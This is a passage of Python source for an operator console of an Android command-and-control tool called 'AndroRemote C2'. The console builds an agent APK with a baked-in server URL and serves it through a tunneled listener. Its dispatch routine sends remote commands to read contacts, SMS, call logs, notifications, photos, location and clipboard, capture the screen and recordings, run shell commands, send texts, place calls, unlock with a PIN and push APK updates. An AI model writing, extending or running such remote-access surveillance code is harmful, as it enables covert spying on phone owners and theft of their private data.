        return [s for s in ("/sdcard", "/sdcard/Download", "/sdcard/DCIM", "/sdcard/Documents", "/data/data") if s.startswith(text)]
    if cmd == "monitor" and arg_idx == 1:
        return [s for s in ("status", "history", "clear") if s.startswith(text)]

    # Check plugin-specific completers
    if PLUGIN_MANAGER and PLUGIN_MANAGER.has_command(cmd):
        res = PLUGIN_MANAGER.get_completions(text, tokens)
        if res:
            return res

    return []


_completer_matches = []


def c2_completer(text, state):
    global _completer_matches
    if state == 0:
        _completer_matches = _compute_completions(text)
    if state < len(_completer_matches):
        return _completer_matches[state]
    return None


def setup_autocomplete():
    if "libedit" in getattr(readline, "__doc__", ""):
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")
        readline.parse_and_bind("set show-all-if-ambiguous on")
        readline.parse_and_bind("set completion-ignore-case on")
        readline.parse_and_bind("set completion-query-items 200")
        readline.parse_and_bind("set page-completions off")
    readline.set_completer_delims(" \t\n")
    readline.set_completer(c2_completer)


def get_readline_prompt():
    """Build ANSI prompt with \001...\002 markers so readline measures visible length accurately.
    Properly displays c2> and c2:tag> with zero cursor offset drift."""
    active = ACTIVE["id"]
    if active:
        tag = alias_tag(active)
        return f"\001\033[1;35m\002c2\001\033[0m\002:\001\033[1;36m\002{tag}\001\033[1;37m\002>\001\033[0m\002 "
    else:
        return "\001\033[1;35m\002c2\001\033[1;37m\002>\001\033[0m\002 "

def cmd_build(target_url=None):
    root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    build_script = os.path.join(root_dir, "build.sh")
    if not os.path.isfile(build_script):
        if os.path.isfile("build.sh"):
            build_script = os.path.abspath("build.sh")
        else:
            err("build.sh not found")
            return False

    url = target_url or TUNNEL.get("url")
    if not url:
        cfg = tunnel_named_cfg()
        if cfg and cfg.get("hostname"):
            url = f"https://{cfg['hostname']}"
    if not url:
        port = ARGS.port if ARGS else PORT_DEFAULT
        proto = "https" if TLS else "http"
        url = f"{proto}://127.0.0.1:{port}"

    with console.status(f"[cyan]Building agent APK for [bold]{escape(url)}[/bold]...[/cyan]", spinner="dots"):
        try:
            res = subprocess.run(
                ["/bin/sh", build_script, url],
                cwd=os.path.dirname(build_script),
                capture_output=True,
                text=True,
            )
        except Exception as e:
            err(f"build execution failed: {e}")
            return False

    if res.returncode != 0:
        err("APK build failed:")
        for line in (res.stderr or res.stdout).splitlines()[-10:]:
            console.print(f"    [red dim]{escape(line)}[/red dim]")
        return False

    apk_path = os.path.join(os.path.dirname(build_script), "build", "apk", "androremote.apk")
    size = os.path.getsize(apk_path) if os.path.isfile(apk_path) else 0
    ok(f"built [bold cyan]{escape(apk_path)}[/bold cyan] ({size:,} bytes)")
    console.print(f"  [white bold]baked C2 URL[/white bold]   [green]{escape(url)}[/green]")
    console.print(f"  [white bold]encryption[/white bold]     [green]AES-256-GCM[/green] [dim](key {key_fp()}…)[/dim]")
    console.print(f"  [dim]Install via adb: [bold cyan]adb install -r -g {escape(apk_path)}[/bold cyan][/dim]")
    console.print(f"  [dim]Or update over C2: [bold cyan]/update {escape(apk_path)}[/bold cyan][/dim]\n")
    return True


def dispatch(argv):
    """Run one operator command. Returns False to exit console."""
    raw_op = argv[0]
    op = raw_op.lstrip("/").lower()
    rest = argv[1:]

    force_refresh = False
    if "--refresh" in rest:
        force_refresh = True
        rest = [r for r in rest if r != "--refresh"]
    elif "-r" in rest:
        force_refresh = True
        rest = [r for r in rest if r != "-r"]
    if op in ("quit", "exit", "q"):
        return False
    elif op in ("help", "?", ""):
        cmd_help(rest[0] if rest else None)
    elif op in ("sessions", "list", "clients"):
        print_sessions()
    elif op == "use":
        cmd_use(rest[0] if rest else None)
    elif op in ("all", "broadcast"):
        if not rest:
            usage("all <op...>")
        else:
            cmd_broadcast(" ".join(rest))
    elif op == "results":
        cmd_results()
    elif op == "status":
        cmd_status()
    elif op == "clear":
        console.clear()
    elif op in ("plugins", "plugin"):
        cmd_plugin(rest)
    elif op == "cache":
        cmd_cache(rest)
    elif op == "history":
        format_history(start_page=int(rest[0]) if rest and rest[0].isdigit() else 1)
    elif op == "rename":
        if len(rest) < 2:
            usage("rename <id|current-tag> <new-tag>")
        else:
            cid = resolve_tag(rest[0])
            if not cid:
                err(f"no session: {escape(rest[0])}")
            else:
                ALIASES[cid] = rest[1]
                save_aliases()
                ok(f"[cyan bold]{escape(rest[0])}[/cyan bold] → [cyan bold]{escape(rest[1])}[/cyan bold]")
    elif op == "forget":
        if not rest:
            usage("forget <id|tag>")
        else:
            cid = resolve_tag(rest[0])
            if not cid:
                err(f"no session: {escape(rest[0])}")
            else:
                with LOCK:
                    CLIENTS.pop(cid, None)
                ALIASES.pop(cid, None)
                save_aliases()
                if ACTIVE["id"] == cid:
                    ACTIVE["id"] = None
                ok(f"forgot session [cyan]{escape(alias_tag(cid))}[/cyan] (it returns on next beacon)")
    elif op == "fastpoll":
        show_result(send_and_wait("FASTPOLL " + (rest[0] if rest else "120")) or "")
    elif op == "ping":
        show_result(send_and_wait("PING") or "")
    elif op == "id":
        show_result(send_and_wait("ID", force_refresh=force_refresh) or "")
    elif op == "info":
        format_info(send_and_wait("INFO", force_refresh=force_refresh) or "")
    elif op == "contacts":
        n = rest[0] if rest and rest[0].isdigit() else "50"
        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
        format_contacts(send_and_wait(f"CONTACTS {n}", force_refresh=force_refresh) or "", page=page)
    elif op == "smsin":
        n = rest[0] if rest and rest[0].isdigit() else "20"
        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
        format_smsin(send_and_wait(f"SMSIN {n}", force_refresh=force_refresh) or "", page=page)
    elif op == "perms":
        format_perms(send_and_wait("PERMS", force_refresh=force_refresh) or "")
    elif op == "apps":
        page = int(rest[0]) if rest and rest[0].isdigit() else 1
        format_apps(send_and_wait("APPS", force_refresh=force_refresh) or "", page=page)
    elif op == "notifs":
        n = rest[0] if rest and rest[0].isdigit() else "25"
        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
        format_notifs(send_and_wait(f"NOTIFS {n}", force_refresh=force_refresh) or "", page=page)
    elif op == "log":
        page = int(rest[0]) if rest and rest[0].isdigit() else 1
        cmd_log(page=page, force_refresh=force_refresh)
    elif op == "smslog":
        if rest:
            cmd_smslog(rest[0])
        else:
            cmd_log(page=1, force_refresh=force_refresh)
    elif op == "ls":
        path = rest[0] if rest and not rest[0].isdigit() else "/sdcard"
        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else (int(rest[0]) if rest and rest[0].isdigit() else 1)
        format_ls(send_and_wait(f"LS {path}") or "", path=path, page=page)
    elif op == "shell":
        if not rest:
            usage("shell <cmd...>")
        else:
            show_result(send_and_wait("SHELL " + " ".join(rest)) or "")
    elif op == "startapp":
        if not rest:
            usage("startapp <package>")
        else:
            show_result(send_and_wait("STARTAPP " + rest[0]) or "")
    elif op == "sms":
        if len(rest) < 2:
            usage("sms <number> <text>")
        else:
            show_result(send_and_wait("SMS " + rest[0] + " " + " ".join(rest[1:])) or "")
    elif op == "calllog":
        n = rest[0] if rest and rest[0].isdigit() else "25"
        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
        format_calllog(send_and_wait(f"CALLLOG {n}", force_refresh=force_refresh) or "", page=page)
    elif op == "call":
        if not rest:
            usage("call <number>")
        else:
            show_result(send_and_wait("CALL " + rest[0]) or "")
    elif op == "loc":
        show_result(send_and_wait("LOC") or "")
    elif op == "photos":
        n = rest[0] if rest and rest[0].isdigit() else "30"
        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
        format_photos(send_and_wait(f"PHOTOS {n}", force_refresh=force_refresh) or "", page=page)
    elif op == "get":
        if len(rest) < 2:
            usage("get <remote> <local>")
        else:
            download_b64(send_and_wait("GETB64 " + b64s(rest[0])) or "", rest[1])
    elif op == "put":
        if len(rest) < 2:
            usage("put <local> <remote>")
        else:
            try:
                with open(rest[0], "rb") as f:
                    data = f.read()
            except OSError as e:
                return err(f"read {escape(rest[0])}: {e}")
            if len(data) > 32 * 1024 * 1024:
                return err("put: >32MB")
            total_bytes = len(data)
            fname = os.path.basename(rest[0])
            with Progress(
                SpinnerColumn(spinner_name="dots", style="cyan"),
                TextColumn(f"[bold cyan]Preparing [white]{escape(fname)}[/white][/bold cyan]"),
                BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
                TextColumn("[bold green]{task.completed:,}[/bold green]/{task.total:,} bytes"),
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task("Preparing", total=total_bytes)
                payload = "PUTB64 " + b64s(rest[1]) + " " + base64.b64encode(data).decode()
                progress.advance(task, total_bytes)
            show_result(send_and_wait(payload) or "")
    elif op == "screen":
        dest = rest[0] if rest else "screen.png"
        download_b64(send_and_wait("SCREENB64") or "", dest)
    elif op == "rec":
        secs = rest[0] if rest else "10"
        r = send_and_wait("RECORD " + secs)
        if r is None:
            return True
        show_result(r)
        parts = r.split(" ")
        if parts[0] == "OK" and len(parts) >= 4:
            path = parts[2]
            dest = rest[1] if len(rest) > 1 else os.path.basename(path)
            download_b64(send_and_wait("GETB64 " + b64s(path)) or "", dest)
    elif op == "tap":
        if len(rest) < 2:
            usage("tap <x> <y>")
        else:
            show_result(send_and_wait("TAP " + rest[0] + " " + rest[1]) or "")
    elif op == "swipe":
        if len(rest) < 4:
            usage("swipe <x1> <y1> <x2> <y2> [ms]")
        else:
            show_result(send_and_wait("SWIPE " + " ".join(rest)) or "")
    elif op == "settext":
        if not rest:
            usage("settext <text>")
        else:
            show_result(send_and_wait("SETTEXT " + " ".join(rest)) or "")
    elif op == "gaction":
        if not rest:
            usage("gaction back|home|recents|notifications|quicksettings|power|lock|screenshot")
        else:
            show_result(send_and_wait("GACTION " + rest[0]) or "")
    elif op == "wake":
        show_result(send_and_wait("WAKE " + (rest[0] if rest else "")) or "")
    elif op == "sleep":
        show_result(send_and_wait("SLEEP") or "")
    elif op == "unlock":
        if not rest:
            usage("unlock <pin>")
        else:
            show_result(send_and_wait("UNLOCK " + rest[0]) or "")
    elif op == "vol":
        show_result(send_and_wait("VOL " + (rest[0] if rest else "")) or "")
    elif op == "clipset":
        if not rest:
            usage("clipset <text>")
        else:
            show_result(send_and_wait("CLIPSET " + " ".join(rest)) or "")
    elif op == "clipget":
        show_result(send_and_wait("CLIPGET") or "")
    elif op == "torch":
        if not rest:
            usage("torch on|off")
        else:
            show_result(send_and_wait("TORCH " + rest[0]) or "")
    elif op == "vibrate":
        show_result(send_and_wait("VIBRATE " + (rest[0] if rest else "")) or "")
    elif op == "update":
        if not rest:
            usage("update <local.apk>")
        else:
            try:
                with open(rest[0], "rb") as f:
                    data = f.read()
            except OSError as e:
                return err(f"read {escape(rest[0])}: {e}")
            if len(data) > 32 * 1024 * 1024:
                return err("update: >32MB")
            remote = "/storage/emulated/0/Android/data/com.ohmpi.androremote/files/update.apk"
            total_bytes = len(data)
            with Progress(
                SpinnerColumn(spinner_name="dots", style="cyan"),
                TextColumn("[bold cyan]Packaging APK update[/bold cyan]"),
                BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
                TextColumn("[bold green]{task.completed:,}[/bold green]/{task.total:,} bytes"),
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task("Packaging", total=total_bytes)
                payload = "PUTB64 " + b64s(remote) + " " + base64.b64encode(data).decode()
                progress.advance(task, total_bytes)
            show_result(send_and_wait(payload) or "")
            show_result(send_and_wait("INSTALL " + remote) or "")
            console.print("  [dim](device will re-beacon after the update; check: /installstatus)[/dim]")
    elif op == "installstatus":
        show_result(send_and_wait("INSTALLSTATUS") or "")
    elif op == "result":
        cid = ACTIVE["id"]
        with LOCK:
            c = CLIENTS.get(cid)
        if c and c["result"]:
            console.print(Rule(f"LAST RESULT · {escape(alias_tag(cid))}", style="dim"))
            show_result(c["result"])
            console.print()
        else:
            ev("*", "no result yet", "cyan")
    elif op == "build":
        cmd_build(rest[0] if rest else None)
    elif PLUGIN_MANAGER and PLUGIN_MANAGER.has_command(op):
        PLUGIN_MANAGER.dispatch(op, rest)
    else:
        err(f"unknown command: '[bold]{escape(raw_op)}[/bold]'  [dim](try: /help or Tab)[/dim]")
    return True


# ─────────────────────────── event log ────────────────────────────────

MARKUP_RE = re.compile(r"\[/?(?:[a-z ]+)\]")


def ev(sym, msg, style=""):
    """Timestamped operator event: console + rotating plain-text log."""
    console.print(f"  [dim]\\[{datetime.now().strftime('%H:%M:%S')}][/dim] "
                  + (f"[{style}]{sym}[/]" if style else sym) + f" {msg}")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now().isoformat(timespec='seconds')} {sym} {MARKUP_RE.sub('', msg)}\n")
    except Exception:
        pass


class C2Console(cmd.Cmd):
    """Interactive command loop for AndroRemote C2 (cmd + readline)."""

    def __init__(self):
        super().__init__()
        self.use_rawinput = True
        self.update_prompt()

    def update_prompt(self):
        self.prompt = get_readline_prompt()

    def precmd(self, line):
        self.update_prompt()
        return line

    def postcmd(self, stop, line):
        self.update_prompt()
        return stop

    def emptyline(self):
        pass

    def default(self, line):
        line = line.strip()
        if not line:
            return False
        try:
            argv = shlex.split(line)
        except ValueError as e:
            err(f"parse: {escape(str(e))}")
            return False
        try:
            res = dispatch(argv)
            if res is False:
                return True
        except KeyboardInterrupt:
            console.print("  [yellow]^C interrupted — command may still be queued[/yellow]")
        except Exception as e:
            err(f"{type(e).__name__}: {escape(str(e))}")
        return False

    def onecmd(self, line):
        return self.default(line)


def repl():
    setup_autocomplete()
    ev("*", "console ready — [bold cyan]/help[/bold cyan] for commands, "
            "[bold cyan]/sessions[/bold cyan] to list agents, [bold cyan]/plugins[/bold cyan] for plugins · [dim]Tab autocompletes[/dim]", "cyan")
    console.print()
    try:
        readline.read_history_file(HISTORY_FILE)
    except Exception:
        pass

    c2_console = C2Console()
    try:
        c2_console.cmdloop()
    except (EOFError, KeyboardInterrupt):
        console.print()
    finally:
        try:
            readline.set_history_length(1000)
            readline.write_history_file(HISTORY_FILE)
        except Exception:
            pass

BANNER_ART = r"""
 █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗     ██████╗██████╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗   ██╔════╝██╔══██╗
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║   ██║     ██║  ██║
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║   ██║     ██║  ██║
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██╗╚██████╗██████╔╝
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝╚═════╝"""


def init_plugins():
    global PLUGIN_MANAGER
    ctx = PluginContext(
        console=console,
        get_active_id=lambda: ACTIVE["id"],
        get_clients=lambda: dict(CLIENTS),
        send_and_wait_fn=send_and_wait,
        queue_fn=queue,
        broadcast_fn=cmd_broadcast,
        alias_tag_fn=alias_tag,
        resolve_tag_fn=resolve_tag,
        log_fn=ev,
        show_result_fn=show_result,
        home_dir=HOME_DIR,
    )
    PLUGIN_MANAGER = PluginManager(ctx)
    PLUGIN_MANAGER.load_all()
    return PLUGIN_MANAGER


def build_parser(prog="androremote"):
    ap = argparse.ArgumentParser(prog=prog, description="AndroRemote C2 server")
    ap.add_argument("--port", type=int, default=PORT_DEFAULT, help=f"C2 HTTP port (default: {PORT_DEFAULT})")
    ap.add_argument("--tls", action="store_true", help="TLS listener (self-signed, auto-generated) for LAN/https agents")
    ap.add_argument("--no-enc", action="store_true", help="disable AES-256-GCM payload encryption")
    ap.add_argument("--tunnel", choices=["named", "quick", "off"], default=None,
                    help="override tunnel mode (default: named if configured, else quick)")
    ap.add_argument("--setup-tunnel", metavar="HOSTNAME", help="one-time: create a persistent named Cloudflare tunnel")
    return ap


def main(argv=None):
    global ARGS, TLS
    ap = build_parser()
    ARGS = ap.parse_args(argv if argv is not None else sys.argv[1:])

    console.print(BANNER_ART, style="cyan bold", markup=False)
    console.print("[dim]        Android agent · command & control · operator console[/dim]\n")

    os.makedirs(HOME_DIR, exist_ok=True)
    load_aliases()

    if ARGS.setup_tunnel:
        cmd_setup_tunnel(ARGS.setup_tunnel)
        return

    console.print(Rule("INITIALIZING", style="dim"))
    console.print("  [white bold]listener[/white bold]   "
                  + (f"[green]https://0.0.0.0:{ARGS.port}[/green]  [dim](TLS)[/dim]"
                     if ARGS.tls else f"[green]http://0.0.0.0:{ARGS.port}[/green]"))
    srv = ThreadingHTTPServer(("0.0.0.0", ARGS.port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    if ARGS.tls:
        TLS = True
        ensure_cert()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CERT_FILE, CERT_KEY_FILE)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        console.print(f"  [white bold]cert pin[/white bold]    [cyan]{cert_pin()}[/cyan]  "
                      f"[dim](bake with: C2_PIN={cert_pin()} ./build.sh <url>)[/dim]")
    if not ARGS.no_enc:
        load_key()
        console.print(f"  [white bold]crypto[/white bold]     [green]AES-256-GCM[/green] "
                      f"[dim]key {key_fp()}…  ({KEY_FILE})[/dim]")
    else:
        console.print("  [white bold]crypto[/white bold]     [yellow]disabled[/yellow] [dim](--no-enc)[/dim]")

    # Initialize modular plugins
    console.print("  [white bold]plugins[/white bold]    [dim]initializing modular plugin engine...[/dim]")
    init_plugins()

    mode = ARGS.tunnel or ("named" if tunnel_named_cfg() else "quick")
    if mode == "named" and not tunnel_named_cfg():
        mode = "quick"
    if mode == "named":
        cfg = tunnel_named_cfg()
        TUNNEL["url"] = f"https://{cfg['hostname']}"
        console.print(f"  [white bold]tunnel[/white bold]     [green]https://{cfg['hostname']}[/green] "
                      f"[dim](persistent named tunnel · supervised)[/dim]")
    elif mode == "quick":
        console.print("  [white bold]tunnel[/white bold]     [dim]starting quick tunnel "
                      "(URL arrives in a few seconds)…[/dim]")
        console.print("  [yellow bold]warning[/yellow bold]   [yellow]quick-tunnel URL rotates on every "
                      "restart — installed APKs bake the old URL and will NOT reconnect. "
                      "For a restart-proof URL run once: "
                      "androremote --setup-tunnel c2.yourdomain.com[/yellow]")
    start_tunnel_thread(mode)
    console.print(f"  [white bold]started[/white bold]    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    try:
        repl()
    finally:
        TUNNEL["run"] = False
        srv.shutdown()
        if TUNNEL["proc"] and TUNNEL["proc"].poll() is None:
            TUNNEL["proc"].terminate()
        ev("*", "shutting down — listener closed, tunnel terminated", "yellow")


if __name__ == "__main__":
    main()
